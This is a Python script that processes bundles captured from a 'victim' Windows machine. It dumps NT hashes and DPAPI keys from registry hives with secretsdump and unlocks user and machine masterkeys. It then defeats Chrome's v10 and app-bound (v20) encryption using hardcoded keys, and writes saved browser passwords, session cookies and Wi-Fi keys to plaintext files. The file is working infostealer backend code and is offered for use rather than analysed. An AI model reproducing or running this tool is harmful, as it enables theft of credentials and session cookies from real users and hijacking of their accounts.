#!/usr/bin/env python3
"""offline_unlock.py -- turn captured bundles into plaintext credentials.

chain:
  1. hives (hive:SAM/SYSTEM/SECURITY) -> secretsdump -> NT hashes,
     LSA secrets, DPAPI_SYSTEM machine/user keys, cached logons
  2. DPAPI: user masterkeys (win:protect/*) unlocked with the user's NT
     hash; machine masterkeys (win:mprotect/*) unlocked with
     dpapi_machinekey -- via impacket.dpapi
  3. os_crypt: Local State encrypted_key -> DPAPI blob -> 32B AES key ->
     AES-256-GCM decrypt all v10 blobs (cookies + saved passwords)
  4. ABE (v20): app_bound_encrypted_key -> outer DPAPI (machine key) ->
     inner DPAPI (user key) -> app-bound AES key -> decrypt v20 blobs
  5. wifi part -> cleartext PSKs

usage: offline_unlock.py --bundle <dir-or-bundle.bin> [--psk-file server/psk.txt]
                          [--out UNLOCK_DIR]
"""
import argparse
import base64
import glob
import io
import json
import os
import re
import struct
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from cryptography.hazmat.primitives.ciphers.aead import AESGCM  # noqa: E402


def unlock_key_from_nthash(nthash_hex, sid):
    """user DPAPI key = SHA1(nthash || sid_utf16le)"""
    import hashlib
    return hashlib.sha1(bytes.fromhex(nthash_hex) + sid.encode("utf-16le")).digest()


def dpapi_blob_decrypt(blob_bytes, masterkey_bytes, entropy=None):
    """decrypt a DPAPI blob given the decrypted 64-byte masterkey"""
    from impacket.dpapi import DPAPI_BLOB
    blob = DPAPI_BLOB(blob_bytes)
    clear = blob.decrypt(masterkey_bytes, entropy)
    return clear


def load_masterkey_file(path, key):
    from impacket.dpapi import MasterKeyFile, MasterKey
    raw = open(path, "rb").read()
    mf = MasterKeyFile(raw)
    off = len(mf.getData())
    mk = MasterKey(raw[off:off + mf["MasterKeyLen"]])
    return mk.decrypt(key)  # returns 64-byte decrypted masterkey


CNG_ENTROPY = b"xT5rZW5qVVbrvpuA\x00"   # universal MS CNG key-blob entropy
FLAG1_KEY = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
FLAG3_XOR = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
FLAG4_XOR = bytes.fromhex("208A6DA7114A44E6B463114BD9DA397E939ADEFEDBF4588117926B0F2C503158")
KDBM_HDR = 12   # "KDBM" + version + length precede the 32-byte key material


def derive_v20_from_ksp(inner, machine_mk, parts_dir, extra_dirs=None):
    """flag-4 offline chain: KSP file -> CNG key -> CBC -> XOR -> GCM.
    inner = user-DPAPI-decrypted ABE plaintext (needs live session or
    recorded bytes). Returns the 32-byte v20 master key."""
    import glob
    import re as _re
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    r = io.BytesIO(inner)
    hlen = struct.unpack("<I", r.read(4))[0]
    r.read(hlen)
    struct.unpack("<I", r.read(4))
    flag = r.read(1)[0]
    if flag in (1, 2):
        from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
        iv, ct, tag = r.read(12), r.read(32), r.read(16)
        if flag == 1:
            return AESGCM(FLAG1_KEY).decrypt(iv, ct + tag, None)
        return ChaCha20Poly1305(bytes.fromhex(
            "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660"
        )).decrypt(iv, ct + tag, None)
    if flag not in (3, 4):
        raise ValueError("unsupported flag %d" % flag)
    enc_key, iv, ct, tag = r.read(32), r.read(12), r.read(32), r.read(16)
    # find the KSP file whose DPAPI blob decrypts (last blob in file)
    MAGIC = b"\x01\x00\x00\x00\xd0\x8c\x9d\xdf"
    cands = glob.glob(os.path.join(parts_dir, "win_systemkeys_*")) + \
        glob.glob(os.path.join(parts_dir, "win:mprotect_*"))
    for d in (extra_dirs or []):
        if d and os.path.isdir(d):
            cands += [os.path.join(d, f) for f in os.listdir(d)]
    # sibling systemkeys/ next to the bundle dir (robocopy convention)
    sk_sib = os.path.join(os.path.dirname(os.path.abspath(parts_dir)),
                          "..", "systemkeys")
    if os.path.isdir(sk_sib):
        cands += [os.path.join(sk_sib, f) for f in os.listdir(sk_sib)]
    for path in cands:
        base = os.path.basename(path)
        if any(x in base for x in (".log", ".LOG", ".TM", ".blf", "regtrans", "Preferred", "Diagnostic")):
            continue
        try:
            raw = open(path, "rb").read()
        except Exception:
            continue
        for off in [m.start() for m in _re.finditer(_re.escape(MAGIC), raw)][::-1]:
            for mk in machine_mk.values():
                try:
                    clear = dpapi_blob_decrypt(raw[off:], mk, CNG_ENTROPY)
                except Exception:
                    continue
                if clear and clear[:4] == b"KDBM":
                    ksp_key = clear[KDBM_HDR:KDBM_HDR + 32]
                    stage1 = Cipher(algorithms.AES(ksp_key),
                                    modes.CBC(b"\x00" * 16)).decryptor().update(enc_key)
                    xor = FLAG3_XOR if flag == 3 else FLAG4_XOR
                    stage2 = bytes(a ^ b for a, b in zip(stage1, xor))
                    return AESGCM(stage2).decrypt(iv, ct + tag, None)
    return None


def gcm_decrypt_v10(key, blob):
    """v10/v11/v20 blob: prefix(3) + nonce(12) + ct + tag(16)"""
    if len(blob) < 31:
        return None
    body = blob[3:]
    nonce, rest = body[:12], body[12:]
    ct, tag = rest[:-16], rest[-16:]
    try:
        return AESGCM(key).decrypt(nonce, ct + tag, None)
    except Exception:
        return None


def run_secretsdump(parts_dir, py_exe=sys.executable):
    sam = glob.glob(os.path.join(parts_dir, "hive_SAM"))
    system = glob.glob(os.path.join(parts_dir, "hive_SYSTEM"))
    security = glob.glob(os.path.join(parts_dir, "hive_SECURITY"))
    if not (sam and system):
        return None
    cmd = [py_exe, os.path.join(os.path.dirname(os.path.dirname(py_exe)),
                                "Scripts", "secretsdump.py"),
           "-sam", sam[0], "-system", system[0]]
    if not os.path.exists(cmd[1]):
        cmd = [py_exe, "-m", "impacket.examples.secretsdump",
               "-sam", sam[0], "-system", system[0]]
    if security:
        cmd += ["-security", security[0]]
    cmd += ["LOCAL"]
    r = subprocess.run(cmd, capture_output=True, text=True)
    out = r.stdout + r.stderr
    hashes, machine_key, user_key, extras = [], None, None, []
    for line in out.splitlines():
        m = re.match(r"^(.+?):(\d+):([0-9a-f]{32}):([0-9a-f]{32}):::", line)
        if m:
            hashes.append({"user": m.group(1), "rid": int(m.group(2)),
                           "lm": m.group(3), "nt": m.group(4)})
        if line.startswith("dpapi_machinekey:"):
            machine_key = line.split(":")[1].replace("0x", "")
        if line.startswith("dpapi_userkey:"):
            user_key = line.split(":")[1].replace("0x", "")
        if ":::" not in line and line.startswith(("*", "[")):
            extras.append(line)
    return {"hashes": hashes, "dpapi_machinekey": machine_key,
            "dpapi_userkey": user_key, "extra": extras}


def parse_wifi(data):
    text = data.decode("utf-8", "replace")
    nets, cur = [], None
    for ln in text.splitlines():
        ln = ln.rstrip("\r")
        m = re.search(r"Profile\s*:\s*(.+)$", ln) or re.search(r"SSID name\s*:\s*(.+)$", ln)
        if m:
            cur = m.group(1).strip()
        k = re.search(r"Key Content\s*:\s*(.+)$", ln)
        if k and cur:
            nets.append({"ssid": cur, "psk": k.group(1).strip()})
    return nets


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--bundle", required=True)
    ap.add_argument("--psk-file", default=os.path.join(HERE, "psk.txt"))
    ap.add_argument("--nthash", default=None,
                    help="user NT hash hex (else taken from secretsdump RID 1000/admin)")
    ap.add_argument("--password", default=None,
                    help="user's Windows/Microsoft-account password (derives the "
                         "DPAPI key; needed on PIN/Hello boxes where the local "
                         "hash is blank)")
    ap.add_argument("--sid", default=None, help="user SID (else auto-detect from protect files)")
    ap.add_argument("--inner-hex", default=None,
                    help="recorded user-layer plaintext of the ABE blob (hex) "
                         "for boxes whose user masterkeys are unavailable")
    ap.add_argument("--systemkeys-dir", default=None,
                    help="dir with SystemKeys CNG file copies "
                         "(also auto-found in bundle parts / sibling 'systemkeys')")
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    import shcrypto
    psk = open(args.psk_file).read().strip().encode()

    if os.path.isdir(args.bundle):
        bdir = args.bundle
        bpath = os.path.join(bdir, "bundle.bin")
    else:
        bpath = args.bundle
        bdir = os.path.splitext(bpath)[0] + "_parsed"
        os.makedirs(bdir, exist_ok=True)
    parts_dir = os.path.join(bdir, "parts")
    os.makedirs(parts_dir, exist_ok=True)

    manifest, parts = shcrypto.unpack(open(bpath, "rb").read(), psk)
    pd = dict(parts)
    for name, data in pd.items():
        safe = re.sub(r"[^A-Za-z0-9_.()-]", "_", name)
        open(os.path.join(parts_dir, safe), "wb").write(data)
    print(f"[+] bundle: {len(pd)} parts, elevated={manifest.get('victim', {}).get('elevated')}")

    report, creds = [], {}
    outdir = args.out or os.path.join(bdir, "unlocked")
    os.makedirs(outdir, exist_ok=True)

    # ---- 1) hashes ----
    sd = run_secretsdump(parts_dir)
    nthash = args.nthash
    if sd:
        creds["nt_hashes"] = sd["hashes"]
        report.append(f"[hashes] {len(sd['hashes'])} accounts extracted")
        for h in sd["hashes"]:
            empty = h["nt"] == "31d6cfe0d16ae931b73c59d7e0c089c0"
            report.append(f"    {h['user']:<24} rid={h['rid']:<5} "
                          f"nt={h['nt']}{'  (empty password)' if empty else ''}")
        if sd["dpapi_machinekey"]:
            report.append(f"[dpapi] machinekey={sd['dpapi_machinekey'][:16]}... "
                          f"userkey={str(sd['dpapi_userkey'])[:16]}...")
        if not nthash:
            # the interactive user's hash (RID 1000), even if it is the
            # empty-password hash -- DPAPI keys still derive from it
            hit = [h for h in sd["hashes"] if h["rid"] == 1000]
            if not hit:
                hit = [h for h in sd["hashes"] if h["rid"] == 500]
            if hit:
                nthash = hit[0]["nt"]
                report.append(f"[dpapi] using NT hash of {hit[0]['user']} "
                              f"({'blank password' if nthash == '31d6cfe0d16ae931b73c59d7e0c089c0' else 'non-empty'}) "
                              f"for user masterkeys")

    # ---- 2) masterkeys ----
    user_mk_guids = glob.glob(os.path.join(parts_dir, "win_protect_S-1-5-21-*"))
    sid = args.sid
    if not sid and user_mk_guids:
        m = re.search(r"(S-1-5-21-\d+-\d+-\d+)", os.path.basename(user_mk_guids[0]))
        if m:
            sid = m.group(1)

    # key candidates for user-scope masterkeys, in order:
    #   1. --password (plaintext; MD4->NT hash; covers Microsoft accounts
    #      and PIN/Hello boxes where the local hash is blank)
    #   2. NT hash from the SAM dump (local password logon)
    user_key_candidates = []
    if args.password:
        import hashlib
        try:
            from Crypto.Hash import MD4  # type: ignore
            nthash_pw = MD4.new(args.password.encode("utf-16le")).hexdigest()
        except ImportError:
            nthash_pw = hashlib.new("md4", args.password.encode("utf-16le")).hexdigest()
        user_key_candidates.append(("password", nthash_pw))
    if nthash:
        user_key_candidates.append(("nthash", nthash))

    unlocked_user_mk = {}
    for label, h in user_key_candidates:
        key = unlock_key_from_nthash(h, sid) if sid else None
        if not key:
            continue
        for path in user_mk_guids:
            base = os.path.basename(path)
            if "Preferred" in base or "CREDHIST" in base or "SYNCHIST" in base:
                continue
            try:
                out = load_masterkey_file(path, key)
                if out:
                    unlocked_user_mk[base] = out
            except Exception:
                pass
        if unlocked_user_mk:
            report.append(f"[dpapi] user masterkeys unlocked via {label}: "
                          f"{len(unlocked_user_mk)}")
            break
        else:
            report.append(f"[dpapi] user masterkeys NOT unlocked via {label} "
                          f"(PIN/Hello or wrong credential?)")

    # machine-scope: S-1-5-18 root unlocks with dpapi_machinekey;
    # S-1-5-18\User (what ABE outers reference) unlocks with dpapi_userkey
    machine_mk = {}
    if sd and sd["dpapi_machinekey"]:
        mk_hex = sd["dpapi_machinekey"]
        uk_hex = sd["dpapi_userkey"]
        for path in glob.glob(os.path.join(parts_dir, "win_mprotect_Protect_S-1-5-18*")):
            base = os.path.basename(path)
            if ("Preferred" in base or ".log" in base.lower()
                    or "Diagnostic" in base or ".LOG" in base or ".TM" in base
                    or ".blf" in base or "regtrans" in base or base.endswith("_User")):
                continue
            try:
                out = load_masterkey_file(path, bytes.fromhex(mk_hex))
                if out:
                    machine_mk[base] = out
            except Exception:
                pass
        for path in glob.glob(os.path.join(parts_dir,
                                           "win_mprotect_Protect_S-1-5-18_User_*")):
            base = os.path.basename(path)
            if ("Preferred" in base or "Diagnostic" in base or ".log" in base.lower()):
                continue
            try:
                out = load_masterkey_file(path, bytes.fromhex(uk_hex))
                if out:
                    machine_mk[base] = out
            except Exception:
                pass
        report.append(f"[dpapi] machine masterkeys unlocked: {len(machine_mk)}")

    # ---- helper: decrypt any DPAPI blob with available masterkeys ----
    def dpapi_decrypt(blob):
        for mk in list(unlocked_user_mk.values()) + list(machine_mk.values()):
            try:
                clear = dpapi_blob_decrypt(blob, mk)
                if clear:
                    return clear
            except Exception:
                continue
        return None

    # ---- 3) os_crypt v10 ----
    v10key = None
    for name, data in pd.items():
        if not name.lower().endswith("localstate") and "LocalState" not in name:
            continue
        try:
            ls = json.loads(data.decode("utf-16le", "replace") if data[:1] == b"{" else data)
            ek = ls.get("os_crypt", {}).get("encrypted_key", "")
            if ek:
                raw = base64.b64decode(ek)
                if raw[:5] == b"DPAPI":
                    clear = dpapi_decrypt(raw[5:])
                    if clear and len(clear) >= 32:
                        v10key = clear[:32]
                        report.append(f"[os_crypt] {name}: AES key recovered "
                                      f"({v10key.hex()[:16]}...)")
        except Exception:
            continue

    # ---- 4) ABE v20 ----
    abe_key = None
    for name, data in pd.items():
        if "LocalState" not in name and not name.lower().endswith("localstate"):
            continue
        try:
            ls = json.loads(data)
            oc = ls.get("os_crypt", {})
            ab_b64 = oc.get("app_bound_encrypted_key", "")
            if not ab_b64:
                continue
            ab = base64.b64decode(ab_b64)
            # APPB magic (chrome 127+) or legacy DPAPI prefix
            if ab[:4] == b"APPB":
                body = ab[4:]
            elif ab[:5] == b"DPAPI":
                body = ab[5:]
            else:
                body = ab
            outer = None
            for mk in machine_mk.values():
                try:
                    outer = dpapi_blob_decrypt(body, mk)
                    if outer:
                        break
                except Exception:
                    continue
            if outer is None:
                report.append(f"[abe] {name}: outer (machine) layer failed")
                continue
            report.append(f"[abe] {name}: outer layer decrypted ({len(outer)} B)")
            inner = None
            for mk in unlocked_user_mk.values():
                try:
                    inner = dpapi_blob_decrypt(outer, mk)
                    if inner:
                        break
                except Exception:
                    continue
            if inner is None and args.inner_hex:
                try:
                    inner = bytes.fromhex(args.inner_hex.strip())
                    report.append(f"[abe] {name}: using --inner-hex "
                                  f"({len(inner)} B recorded inner)")
                except ValueError:
                    report.append(f"[abe] {name}: bad --inner-hex")
                    continue
            if inner is None:
                report.append(f"[abe] {name}: inner (user) layer failed -- needs "
                              f"--password, --inner-hex, or a live-session unwrap")
                continue
            # flag byte decides the scheme: 1/2 unwrap directly, 3/4 need the
            # CNG SystemKeys chain. inner[:32] alone is only right for
            # pre-137 non-Chrome builds.
            ksp_dirs = [parts_dir]
            if args.systemkeys_dir:
                ksp_dirs.append(args.systemkeys_dir)
            try:
                flag = inner[4 + struct.unpack("<I", inner[:4])[0] + 4]
            except Exception:
                flag = 0
            abe_key = derive_v20_from_ksp(inner, machine_mk, parts_dir,
                                          extra_dirs=ksp_dirs)
            if abe_key is None:
                # pre-137 / other browsers: inner may be the raw key
                abe_key = inner[:32] if len(inner) >= 32 else None
                if abe_key:
                    report.append(f"[abe] {name}: raw-key fallback "
                                  f"(flag byte {flag})")
            if abe_key is None:
                report.append(f"[abe] {name}: flag {flag} derivation failed -- "
                              f"provide --systemkeys-dir with the CNG key files")
                continue
            report.append(f"[abe] {name}: APP-BOUND KEY RECOVERED "
                          f"(flag {flag}, {abe_key.hex()[:16]}...)")
            open(os.path.join(outdir, "v20_master_key.bin"), "wb").write(abe_key)
            break
        except Exception as e:
            report.append(f"[abe] {name}: {e}")

    # ---- 5) decrypt browser blobs ----
    import sqlite3
    total_c, total_p, ok_c, ok_p = 0, 0, 0, 0
    cookies_lines, pass_lines = [], []
    for name, data in pd.items():
        is_cookies = name.endswith("/Cookies") or name.endswith("/Cookies2")
        is_logins = "LoginData" in name
        if not (is_cookies or is_logins):
            continue
        browser = name.split("/")[1] if "/" in name else "?"
        fd, tmp = tempfile.mkstemp(suffix=".db")
        os.write(fd, data)
        os.close(fd)
        try:
            con = sqlite3.connect(tmp)
            if is_cookies:
                try:
                    rows = con.execute(
                        "SELECT host_key, name, encrypted_value, expires_utc "
                        "FROM cookies").fetchall()
                except Exception:
                    rows = []
                for host, cname, ev, exp in rows:
                    total_c += 1
                    val = None
                    if ev[:3] in (b"v10", b"v11", b"v20"):
                        key = abe_key if ev[:3] == b"v20" else v10key
                        if key:
                            d = gcm_decrypt_v10(key, ev)
                            if d:
                                val = d.decode("utf-8", "replace")
                    if val is not None:
                        ok_c += 1
                        cookies_lines.append(f"{host}\tTRUE\t/\tFALSE\t{exp}\t{cname}\t{val}")
            else:
                try:
                    rows = con.execute(
                        "SELECT origin_url, username_value, encrypted_value "
                        "FROM logins").fetchall()
                except Exception:
                    rows = []
                for url, uname, ev in rows:
                    total_p += 1
                    if not uname and not ev:
                        continue
                    pw = None
                    if ev[:3] in (b"v10", b"v11", b"v20"):
                        key = abe_key if ev[:3] == b"v20" else v10key
                        if key:
                            d = gcm_decrypt_v10(key, ev)
                            if d:
                                pw = d.decode("utf-8", "replace")
                    if pw is not None:
                        ok_p += 1
                        pass_lines.append(f"{url}\t{uname}\t{pw}")
            con.close()
        finally:
            os.unlink(tmp)
    if total_c:
        report.append(f"[cookies] {ok_c}/{total_c} decrypted to plaintext")
    if total_p:
        report.append(f"[passwords] {ok_p}/{total_p} saved passwords decrypted")

    # ---- 6) wifi ----
    if "win:wifi" in pd:
        nets = parse_wifi(pd["win:wifi"])
        if nets:
            creds["wifi"] = nets
            report.append(f"[wifi] {len(nets)} networks with cleartext keys: "
                          + ", ".join(n["ssid"] for n in nets))

    # ---- write outputs ----
    if cookies_lines:
        open(os.path.join(outdir, "cookies_all.txt"), "w", encoding="utf-8").write(
            "# Netscape HTTP Cookie File\n" + "\n".join(cookies_lines) + "\n")
    if pass_lines:
        open(os.path.join(outdir, "passwords.txt"), "w", encoding="utf-8").write(
            "url\tusername\tpassword\n" + "\n".join(pass_lines) + "\n")
    creds["report"] = report
    json.dump(creds, open(os.path.join(outdir, "unlocked.json"), "w", encoding="utf-8"),
              indent=2)
    print("\n".join(report))
    print(f"\n[+] unlocked material -> {outdir}")


if __name__ == "__main__":
    main()
